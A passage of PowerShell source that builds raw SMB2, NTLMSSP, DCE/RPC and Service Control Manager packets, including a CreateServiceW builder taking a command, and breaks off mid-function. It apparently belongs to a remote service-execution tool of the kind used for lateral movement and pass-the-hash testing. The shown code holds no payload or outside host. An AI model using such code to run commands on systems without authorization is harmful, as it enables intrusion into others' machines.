        $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)
        $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)
        $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SMB2Header
    }

    function Get-PacketSMB2NegotiateProtocolRequest()
    {
        $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))

        return $packet_SMB2NegotiateProtocolRequest
    }

    function Get-PacketSMB2SessionSetupRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

        return $packet_SMB2SessionSetupRequest 
    }

    function Get-PacketSMB2TreeConnectRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

        return $packet_SMB2TreeConnectRequest
    }

    function Get-PacketSMB2CreateRequestFile()
    {
        param([Byte[]]$packet_named_pipe)

        $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]

        $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)

        return $packet_SMB2CreateRequestFile
    }

    function Get-PacketSMB2ReadRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

        return $packet_SMB2ReadRequest
    }

    function Get-PacketSMB2WriteRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

        $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_write_length)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SMB2WriteRequest
    }

    function Get-PacketSMB2CloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)

        return $packet_SMB2CloseRequest
    }

    function Get-PacketSMB2TreeDisconnectRequest()
    {
        $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2TreeDisconnectRequest
    }

    function Get-PacketSMB2SessionLogoffRequest()
    {
        $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2SessionLogoffRequest
    }

    #NTLM

    function Get-PacketNTLMSSPNegotiate()
    {
        param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
        [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
        [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
        [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
        [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

        $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_version)
        {
            $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)
        }

        return $packet_NTLMSSPNegotiate
    }

    function Get-PacketNTLMSSPAuth()
    {
        param([Byte[]]$packet_NTLM_response)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
        [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
        $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
        [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
        $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
        [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
        $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

        $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

        return $packet_NTLMSSPAuth
    }

    #RPC

    function Get-PacketRPCBind()
    {
        param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

        [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

        $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
        $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
        $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
        $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
        $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
        $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
        $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
        $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
        $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

        if($packet_num_ctx_items[0] -eq 2)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($packet_num_ctx_items[0] -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if($packet_call_ID -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return $packet_RPCBind
    }

    function Get-PacketRPCRequest()
    {
        param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

        if($packet_auth_length -gt 0)
        {
            $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
        }

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
        [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
        $packet_auth_length = $packet_auth_length[0,1]

        $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
        $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
        $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
        $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
        $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
        $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
        $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
        $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

        if($packet_data.Length)
        {
            $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
        }

        return $packet_RPCRequest
    }

    #SCM

    function Get-PacketSCMOpenSCManagerW()
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00

        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
        return $packet_SCMOpenSCManagerW
    }

    function Get-PacketSCMCreateServiceW()
    {
        param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
                [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
        $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID += 0x00,0x00

